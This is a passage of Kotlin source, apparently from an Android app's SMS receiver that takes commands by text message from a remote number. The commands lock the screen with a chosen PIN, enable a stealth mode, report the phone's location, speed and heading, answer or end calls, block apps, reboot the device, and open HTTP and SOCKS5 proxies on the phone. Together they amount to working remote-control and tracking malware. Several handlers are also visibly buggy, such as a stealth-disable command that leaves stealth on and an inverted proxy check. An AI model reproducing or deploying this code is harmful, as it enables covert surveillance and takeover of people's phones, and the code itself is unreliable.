                                                "UNLOCK_DEVICE_SCREEN: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("LOCK_DEVICE_SCREEN_WITH_PIN ") == true) {
                                        if (!isStealthModeEnabled) {
                                            if (context != null) {
                                                val preferences = context.getSharedPreferences(
                                                    "Preferences",
                                                    Context.MODE_MULTI_PROCESS
                                                )
                                                if (!isLocked && !isLockedWithPin) {
                                                    isLockedWithPin = true
                                                    killAll = false
                                                    with(preferences.edit()) {
                                                        putBoolean("IsLockedWithPin", true)
                                                        putString(
                                                            "Pin",
                                                            message.messageBody.removePrefix("LOCK_DEVICE_SCREEN_WITH_PIN ")
                                                        )
                                                        putBoolean("killAll", false)
                                                        commit()
                                                    }
                                                    val i = Intent(
                                                        context,
                                                        LockedWithPinActivity::class.java
                                                    )
                                                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                    context.startActivity(i)
                                                    sendMessage(
                                                        context,
                                                        false,
                                                        "LOCK_DEVICE_SCREEN_WITH_PIN: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    if (isLockedWithPin) {
                                                        val i = Intent(
                                                            context,
                                                            LockedActivity::class.java
                                                        )
                                                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                        i.putExtra(
                                                            "Pin",
                                                            preferences.getString("Pin", "")
                                                        )
                                                        context.startActivity(i)
                                                    }
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "LOCK_DEVICE_SCREEN_WITH_PIN: Operation failed - device already locked",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "LOCK_DEVICE_SCREEN_WITH_PIN: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(context, false, "LOCK_DEVICE_SCREEN_WITH_PIN: Stealth mode is enabled", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody == "LOCK_DEVICE") {
                                        if (!isStealthModeEnabled) {
                                            if (context != null) {
                                                // Use Device Policy Manager to lock the device
                                                val devicePolicyManager =
                                                    context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                                                val adminComponent: ComponentName =
                                                    ComponentName(
                                                        context,
                                                        ReceiverDeviceAdmin::class.java
                                                    )

                                                if (devicePolicyManager.isAdminActive(adminComponent)) {
                                                    devicePolicyManager.lockNow()
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "LOCK_DEVICE: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "LOCK_DEVICE: Operation failed - app is not a device admin",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "LOCK_DEVICE: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "LOCK_DEVICE: Stealth mode is enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("VIBRATE_DEVICE ") == true) {
                                        try {
                                            if (context != null) {
                                                vibrateDevice(
                                                    context,
                                                    message.messageBody!!.removePrefix("VIBRATE_DEVICE ")
                                                        .toLong()
                                                )
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "VIBRATE_DEVICE: Operation completed successfully",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "VIBRATE_DEVICE: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("SHOW_MESSAGE ") == true) {
                                        if (message.messageBody!!.removePrefix("SHOW_MESSAGE ") != "") {
                                            val i = Intent(context, MessageActivity::class.java)
                                            i.putExtra(
                                                "Message",
                                                message.messageBody!!.removePrefix("SHOW_MESSAGE ")
                                            )
                                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            context?.startActivity(intent)
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "SHOW_MESSAGE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "CLEAR_PERSISTENCE") {
                                        FirebaseFirestore.getInstance().clearPersistence()
                                            .addOnCompleteListener {
                                                if (it.isSuccessful) {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "CLEAR_PERSISTENCE: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "CLEAR_PERSISTENCE: Operation failed - ${it.exception?.localizedMessage}",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            }
                                    } else if (message?.messageBody == "GET_POWER_INFO") {
                                        val powerManager =
                                            context?.getSystemService(Context.POWER_SERVICE) as PowerManager
                                        var statusStr = "GET_POWER_INFO: Is Interactive: ${
                                            boolToYesNo(powerManager.isInteractive)
                                        } - Is Power Save Mode Enabled: ${boolToYesNo(powerManager.isPowerSaveMode)}"
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                            statusStr += " - Current Thermal Status: ${powerManager.currentThermalStatus}"
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                                val batteryDischargePrediction =
                                                    powerManager.batteryDischargePrediction
                                                if (batteryDischargePrediction != null) {
                                                    val days = batteryDischargePrediction.toDays()
                                                        .toString()
                                                    val hours = batteryDischargePrediction.toHours()
                                                        .toString()
                                                    val minutes =
                                                        batteryDischargePrediction.toMinutes()
                                                            .toString()
                                                    val seconds =
                                                        batteryDischargePrediction.toSeconds()
                                                            .toString()
                                                    statusStr += " - Battery Discharge Prediction: $days days, $hours hours, $minutes minutes, $seconds seconds"
                                                }
                                            }
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            statusStr
                                        )
                                    } else if (message?.messageBody?.startsWith("REBOOT_DEVICE ") == true) {
                                        try {
                                            val powerManager =
                                                context?.getSystemService(Context.POWER_SERVICE) as PowerManager
                                            sendMessage(
                                                context,
                                                true,
                                                "REBOOT_DEVICE: Rebooting device"
                                            )
                                            powerManager.reboot(
                                                message.messageBody?.removePrefix("REBOOT_DEVICE ")
                                                    .toString()
                                            )
                                            sendMessage(
                                                context,
                                                true,
                                                "REBOOT_DEVICE: Operation failed"
                                            )
                                        } catch (ex: Exception) {
                                            sendMessage(
                                                context,
                                                true,
                                                "REBOOT_DEVICE: Operation failed - ${ex.localizedMessage}"
                                            )
                                        }
                                    } else if (message?.messageBody == "GET_SPEED") {
                                        try {
                                            // Initialize SensorManager
                                            val sensorManager =
                                                context?.getSystemService(SENSOR_SERVICE) as SensorManager

// Get the accelerometer sensor
                                            val accelerometerSensor =
                                                sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

                                            var previousTime: Long = 0
                                            var speed: Float = 0f // Speed in m/s
                                            var hasFirstData =
                                                false // Flag to track if we have the first sensor data
                                            var threshold =
                                                0.02f // Threshold for ignoring tiny movements (e.g., 0.02 m/s^2)
                                            var lastAcceleration =
                                                FloatArray(3) // To store last acceleration values

// Variables for removing gravity using high-pass filter (approximating the device's acceleration)
                                            val gravity =
                                                FloatArray(3) // Store gravity values from the accelerometer
                                            val accel =
                                                FloatArray(3)  // Store the actual acceleration (without gravity)

// Check if the device has an accelerometer
                                            if (accelerometerSensor != null) {
                                                // Create the SensorEventListener to listen for accelerometer data
                                                val accelerometerEventListener = object :
                                                    SensorEventListener {
                                                    override fun onSensorChanged(event: SensorEvent?) {
                                                        // If the event sensor is the accelerometer
                                                        if (event != null && event.sensor.type == Sensor.TYPE_ACCELEROMETER) {
                                                            // Get the accelerometer values (X, Y, Z)
                                                            val ax =
                                                                event.values[0] // X acceleration
                                                            val ay =
                                                                event.values[1] // Y acceleration
                                                            val az =
                                                                event.values[2] // Z acceleration

                                                            // Get the current time in milliseconds
                                                            val currentTime =
                                                                System.currentTimeMillis()

                                                            // Calculate the time difference (in seconds)
                                                            val deltaTime =
                                                                (currentTime - previousTime) / 1000f

                                                            // Ensure a reasonable time difference to avoid noise (minimum 0.01s)
                                                            if (deltaTime >= 0.01) {
                                                                // High-pass filter to remove gravity (subtract gravity vector from the total acceleration)
                                                                // Update gravity using a simple low-pass filter
                                                                val alpha =
                                                                    0.8f // Adjust for sensitivity (adjustable)
                                                                gravity[0] =
                                                                    alpha * gravity[0] + (1 - alpha) * ax
                                                                gravity[1] =
                                                                    alpha * gravity[1] + (1 - alpha) * ay
                                                                gravity[2] =
                                                                    alpha * gravity[2] + (1 - alpha) * az

                                                                // Subtract gravity from the accelerometer values to get the actual acceleration
                                                                accel[0] = ax - gravity[0]
                                                                accel[1] = ay - gravity[1]
                                                                accel[2] = az - gravity[2]

                                                                // Calculate the magnitude of the total acceleration (movement acceleration)
                                                                val magnitude =
                                                                    Math.sqrt((accel[0] * accel[0] + accel[1] * accel[1] + accel[2] * accel[2]).toDouble())
                                                                        .toFloat()

                                                                // Only integrate if the magnitude is above a small threshold
                                                                if (magnitude > threshold) {
                                                                    // Integrating acceleration to calculate speed (magnitude * deltaTime)
                                                                    speed += magnitude * deltaTime
                                                                }

                                                                // Update the previous time for the next iteration
                                                                previousTime = currentTime

                                                                // Mark the flag after the first event
                                                                if (!hasFirstData) {
                                                                    hasFirstData = true
                                                                }
                                                            }

                                                            // If we have valid data (second event), calculate speed and unregister the listener
                                                            if (hasFirstData) {
                                                                // Output the speed once and unregister the listener
                                                                println("Calculated Speed: $speed m/s")

                                                                sendMessage(
                                                                    context,
                                                                    true,
                                                                    "GET_SPEED: $speed m/s"
                                                                )

                                                                // Unregister the listener to stop further updates
                                                                sensorManager.unregisterListener(
                                                                    this
                                                                )
                                                            }
                                                        }
                                                    }

                                                    override fun onAccuracyChanged(
                                                        sensor: Sensor?,
                                                        accuracy: Int
                                                    ) {
                                                        // Send accuracy changes
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            "GET_SPEED: Accuracy is $accuracy m"
                                                        )
                                                    }
                                                }

                                                // Register the accelerometer listener to listen for sensor data
                                                sensorManager.registerListener(
                                                    accelerometerEventListener,
                                                    accelerometerSensor,
                                                    SensorManager.SENSOR_DELAY_UI
                                                )
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "GET_SPEED: Operation failed - device has no accelerometer"
                                                )
                                            }
                                        } catch (ex: Exception) {
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_SPEED: Operation failed - ${ex.localizedMessage}"
                                            )
                                        }
                                    } else if (message?.messageBody == "GET_DEVICE_HEADING") {
                                        if (context != null) {
                                            DeviceOrientationHelper.getDeviceHeading(
                                                context,
                                                object : DeviceOrientationHelper.HeadingCallback {
                                                    override fun onHeadingChanged(heading: Float) {
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            "GET_DEVICE_HEADING: $heading"
                                                        )
                                                    }
                                                },
                                                object : DeviceOrientationHelper.ErrorCallback {
                                                    override fun onError(error: String) {
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            "GET_DEVICE_HEADING: Operation failed - $error"
                                                        )
                                                    }
                                                }
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_DEVICE_HEADING: Operation failed - context is null"
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("SET_INTERRUPTION_FILTER ") == true) {
                                        val filterName = message.messageBody!!.removePrefix("SET_INTERRUPTION_FILTER ")
                                        val mNotificationManager = context!!.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
                                        var error = false
                                        when (filterName) {
                                            "INTERRUPTION_FILTER_ALL" -> {
                                                mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL)
                                            }
                                            "INTERRUPTION_FILTER_NONE" -> {
                                                mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
                                            }
                                            "INTERRUPTION_FILTER_ALARMS" -> {
                                                mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALARMS)
                                            }
                                            "INTERRUPTION_FILTER_PRIORITY" -> {
                                                mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_PRIORITY)
                                            }
                                            else -> {
                                                error = true
                                            }
                                        }
                                        if (!error) {
                                            sendMessage(context, false, "SET_INTERRUPTION_FILTER: Operation completed successfully")
                                        } else {
                                            sendMessage(context, false, "SET_INTERRUPTION_FILTER: Operation failed - invalid filter name")
                                        }
                                    } else if (message?.messageBody == "GET_INTERRUPTION_FILTER") {
                                        val mNotificationManager = context!!.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
                                        when (mNotificationManager!!.currentInterruptionFilter) {
                                            NotificationManager.INTERRUPTION_FILTER_ALL -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY")
                                            }
                                            NotificationManager.INTERRUPTION_FILTER_NONE -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY")
                                            }
                                            NotificationManager.INTERRUPTION_FILTER_ALARMS -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY")
                                            }
                                            NotificationManager.INTERRUPTION_FILTER_PRIORITY -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY")
                                            }
                                            NotificationManager.INTERRUPTION_FILTER_UNKNOWN -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_UNKNOWN")
                                            }
                                            else -> {
                                                sendMessage(context, false, "GET_INTERRUPTION_FILTER: ${mNotificationManager.currentInterruptionFilter}")
                                            }
                                        }
                                    } else if (message?.messageBody == "ENABLE_STEALTH_MODE") {
                                        val preferences = context!!.getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)
                                        isStealthModeEnabled = true
                                        with(preferences.edit()) {
                                            putBoolean("IsStealthModeEnabled", true)
                                            commit()
                                        }
                                        sendMessage(
                                            context,
                                            false,
                                            "ENABLE_STEALTH_MODE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "DISABLE_STEALTH_MODE") {
                                        val preferences = context!!.getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)
                                        isStealthModeEnabled = true
                                        with(preferences.edit()) {
                                            putBoolean("IsStealthModeEnabled", false)
                                            commit()
                                        }
                                        sendMessage(
                                            context,
                                            false,
                                            "DISABLE_STEALTH_MODE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody?.startsWith("ADD_APP_TO_PREVENT_OPENING ") == true) {
                                        appsToPreventOpening.add(message.messageBody!!.removePrefix("ADD_APP_TO_PREVENT_OPENING "))
                                        sendMessage(context, true, "ADD_APP_TO_PREVENT_OPENING: Operation completed successfully")
                                    } else if (message?.messageBody?.startsWith("REMOVE_APP_FROM_PREVENT_OPENING ") == true) {
                                        appsToPreventOpening.remove(message.messageBody!!.removePrefix("REMOVE_APP_FROM_PREVENT_OPENING "))
                                        sendMessage(context, true, "REMOVE_APP_FROM_PREVENT_OPENING: Operation completed successfully")
                                    } else if (message?.messageBody == "CLEAR_APPS_TO_PREVENT_OPENING") {
                                        appsToPreventOpening.clear()
                                        sendMessage(context, true, "CLEAR_APPS_TO_PREVENT_OPENING: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                    } else if (message?.messageBody == "START_WIFI_P2P_SERVER") {
                                        context?.sendBroadcast(Intent(ClientService.ACTION_START_WIFI_P2P_SERVER).apply {
                                            putExtra("ServerPhoneNo", message.originatingAddress)
                                            putExtra("SendBySMS", true)
                                        })
                                        Log.d("SMSReceiver", "Start WiFi P2P server received")
                                    } else if (message?.messageBody == "STOP_WIFI_P2P_SERVER") {
                                        context?.sendBroadcast(Intent(ClientService.ACTION_STOP_WIFI_P2P_SERVER).apply {
                                            putExtra("ServerPhoneNo", message.originatingAddress)
                                            putExtra("SendBySMS", true)
                                        })
                                        Log.d("SMSReceiver", "Stop WiFi P2P server received")
                                    } else if (message?.messageBody == "GET_WIFI_P2P_HOST_ADDRESS") {
                                        context?.sendBroadcast(Intent(ClientService.ACTION_WIFI_P2P_GET_HOST_ADDRESS).apply {
                                            putExtra("ServerPhoneNo", message.originatingAddress)
                                            putExtra("SendBySMS", true)
                                        })
                                        Log.d("SMSReceiver", "Get WiFi P2P host address received")
                                    } else if (message?.messageBody?.startsWith("START_HTTP_PROXY ") == true) {
                                        if (isHttpProxyRunning) {
                                            val port = message.messageBody.removePrefix("START_HTTP_PROXY ").toInt()
                                            context?.startService(HttpProxyService.newStartIntent(context, port))
                                            sendMessage(
                                                context,
                                                true,
                                                "START_HTTP_PROXY: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                            isHttpProxyRunning = true
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "START_HTTP_PROXY: Operation failed - already running",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "STOP_HTTP_PROXY") {
                                        context?.stopService(HttpProxyService.newStopIntent(context))
                                        sendMessage(context, true, "STOP_HTTP_PROXY: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                        isHttpProxyRunning = false
                                    } else if (message?.messageBody == "START_SOCKS5_PROXY") {
                                        if (!isSocks5ProxyRunning) {
                                            context?.startService(Intent(context, Socks5Service::class.java).setAction(
                                                Socks5Service.ACTION_START))
                                            sendMessage(
                                                context,
                                                true,
                                                "START_SOCKS5_PROXY: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                            isSocks5ProxyRunning = true
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "START_SOCKS5_PROXY: Operation failed - already running",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "STOP_SOCKS5_PROXY") {
                                        context?.startService(Intent(context, Socks5Service::class.java).setAction(
                                            Socks5Service.ACTION_STOP))
                                        sendMessage(context, true, "STOP_SOCKS5_PROXY: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                        isSocks5ProxyRunning = false
                                    } else if (message?.messageBody == "ASK_TO_TURN_ON_WIFI") {
                                        val wifiManager = context?.getSystemService(Context.WIFI_SERVICE) as WifiManager
                                        if (!wifiManager.isWifiEnabled) {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                })
                                            } else {
                                                context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS).apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                })
                                            }
                                            sendMessage(
                                                context,
                                                false,
                                                "ASK_TO_TURN_ON_WIFI: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                false,
                                                "ASK_TO_TURN_ON_WIFI: Operation failed - wifi is already enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "ASK_TO_TURN_ON_BLUETOOTH") {
                                        if (bluetoothAdapter == null)
                                            bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
                                        if (!bluetoothAdapter!!.isEnabled) {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                                context?.startActivity(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE).apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                })
                                            } else {
                                                context?.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS).apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                })
                                            }
                                            sendMessage(
                                                context,
                                                false,
                                                "ASK_TO_TURN_ON_BLUETOOTH: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "ASK_TO_TURN_ON_LOCATION") {
                                        val i = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
                                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        context!!.startActivity(i)
                                        sendMessage(context, true, "ASK_TO_TURN_ON_LOCATION: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                    } else if (message?.messageBody == "END_CALL") {
                                        try {
                                            val tm = context!!.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
                                            if (tm.endCall()) {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "END_CALL: Operation completed successfully",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "END_CALL: Operation failed",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "END_CALL: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "SILENCE_CALL_RINGER") {
                                        try {
                                            val tm = context!!.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
                                            tm.silenceRinger()
                                            sendMessage(
                                                context,
                                                true,
                                                "SILENCE_CALL_RINGER: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "SILENCE_CALL_RINGER: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody  == "ACCEPT_RINGING_CALL") {
                                        try {
                                            val tm = context!!.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
                                            tm.acceptRingingCall()
                                            sendMessage(
                                                context,
                                                true,
                                                "ACCEPT_RINGING_CALL: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "ACCEPT_RINGING_CALL: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("GET_CURRENT_LOCATION2 ") == true) {
                                        try {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                                val lm = context!!.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                                                var provider = ""
                                                provider = when (message.messageBody.removePrefix("GET_CURRENT_LOCATION2 ")) {
                                                    "GPS_PROVIDER" -> LocationManager.GPS_PROVIDER
                                                    "FUSED_PROVIDER" -> {
                                                        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R)
                                                            "Unknown"
                                                        else
                                                            LocationManager.FUSED_PROVIDER
                                                    }
                                                    "NETWORK_PROVIDER" -> LocationManager.NETWORK_PROVIDER
                                                    "PASSIVE_PROVIDER" -> LocationManager.PASSIVE_PROVIDER
                                                    else -> "Unknown"
                                                }
                                                if (provider != "Unknown") {
                                                    val cancellationSignal = CancellationSignal()
                                                    lm.getCurrentLocation(
                                                        provider,
                                                        cancellationSignal,
                                                        context.mainExecutor
                                                    ) { location: Location? ->
                                                        if (location != null) {
                                                            val latitude = location.latitude
                                                            val longitude = location.longitude
                                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                                                val messageParts = mutableListOf<String>()
                                                                messageParts.add("GET_CURRENT_LOCATION2: Longitude: $longitude, Latitude: $latitude")
                                                                if (location.hasAccuracy()) messageParts.add(
                                                                    "Accuracy: ${location.accuracy}"
                                                                )
                                                                messageParts.add("Speed: ${location.speed}")
                                                                if (location.hasAltitude()) messageParts.add(
                                                                    "Altitude: ${location.altitude}"
                                                                )
                                                                sendMessage(
                                                                    context,
                                                                    true,
                                                                    messageParts.joinToString(", "),
                                                                    serverPhoneNo = message.originatingAddress
                                                                )
                                                            } else {
                                                                val messageParts = mutableListOf<String>()
                                                                messageParts.add("GET_CURRENT_LOCATION2: Longitude: $longitude, Latitude: $latitude")
                                                                if (location.hasAccuracy()) messageParts.add(
                                                                    "Accuracy: ${location.accuracy}"
                                                                )
                                                                messageParts.add("Speed: ${location.speed}")
                                                                if (location.hasAltitude()) messageParts.add(
                                                                    "Altitude: ${location.altitude}"
                                                                )
                                                                sendMessage(
                                                                    context,
                                                                    true,
                                                                    messageParts.joinToString(", "),
                                                                    serverPhoneNo = message.originatingAddress
                                                                )
                                                            }
                                                        } else {
                                                            sendMessage(
                                                                context,
                                                                true,
                                                                "GET_CURRENT_LOCATION2: Operation failed - location is null",
                                                                serverPhoneNo = message.originatingAddress
                                                            )
                                                        }
                                                    }
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "GET_CURRENT_LOCATION2: Operation failed - provider not supported",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "GET_CURRENT_LOCATION2: Operation failed - API level not supported",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_CURRENT_LOCATION2: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("GET_LAST_KNOWN_LOCATION2 ") == true) {
                                        try {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                                val lm = context!!.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                                                var provider = ""
                                                provider = when (message.messageBody.removePrefix("GET_LAST_KNOWN_LOCATION2 ")) {
                                                    "GPS_PROVIDER" -> LocationManager.GPS_PROVIDER
                                                    "FUSED_PROVIDER" -> {
                                                        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R)
                                                            "Unknown"
                                                        else
                                                            LocationManager.FUSED_PROVIDER
                                                    }
                                                    "NETWORK_PROVIDER" -> LocationManager.NETWORK_PROVIDER
                                                    "PASSIVE_PROVIDER" -> LocationManager.PASSIVE_PROVIDER
                                                    else -> "Unknown"
                                                }
                                                if (provider != "Unknown") {
                                                    val location = lm.getLastKnownLocation(provider)
                                                    if (location != null) {
                                                        val latitude = location.latitude
                                                        val longitude = location.longitude
                                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                                            val messageParts = mutableListOf<String>()
                                                            messageParts.add("GET_LAST_KNOWN_LOCATION2: Longitude: $longitude, Latitude: $latitude")
                                                            if (location.hasAccuracy()) messageParts.add(
                                                                "Accuracy: ${location.accuracy}"
                                                            )
                                                            messageParts.add("Speed: ${location.speed}")
                                                            if (location.hasAltitude()) messageParts.add(
                                                                "Altitude: ${location.altitude}"
                                                            )
                                                            sendMessage(
                                                                context,
                                                                true,
                                                                messageParts.joinToString(", "),
                                                                serverPhoneNo = message.originatingAddress
                                                            )
                                                        } else {
                                                            val messageParts = mutableListOf<String>()
                                                            messageParts.add("GET_LAST_KNOWN_LOCATION2: Longitude: $longitude, Latitude: $latitude")
                                                            if (location.hasAccuracy()) messageParts.add(
                                                                "Accuracy: ${location.accuracy}"
                                                            )
                                                            messageParts.add("Speed: ${location.speed}")
                                                            if (location.hasAltitude()) messageParts.add(
                                                                "Altitude: ${location.altitude}"
                                                            )
                                                            sendMessage(
                                                                context,
                                                                true,
                                                                messageParts.joinToString(", "),
                                                                serverPhoneNo = message.originatingAddress
                                                            )
                                                        }
                                                    } else {
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            "GET_LAST_KNOWN_LOCATION2: Operation failed - location is null",
                                                            serverPhoneNo = message.originatingAddress
                                                        )
                                                    }
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "GET_LAST_KNOWN_LOCATION2: Operation failed - provider not supported",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "GET_LAST_KNOWN_LOCATION2: Operation failed - API level not supported",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_LAST_KNOWN_LOCATION2: Operation failed - ${ex.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "IS_LOCATION_ENABLED") {
                                        val lm = context!!.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                                        sendMessage(
                                            context,
                                            true,
                                            "IS_LOCATION_ENABLED: ${boolToYesNo(lm.isLocationEnabled)}",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "SEND_START_CLIENT_SERVICE_BROADCAST") {
                                        context!!.sendBroadcast(Intent(ClientServiceStarter.ACTION_START_CLIENT_SERVICE))
                                        sendMessage(
                                            context,
                                            true,
                                            "SEND_START_CLIENT_SERVICE_BROADCAST: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody?.startsWith("GEOFENCE_FROM_ENTERING ") == true) {
                                        try {
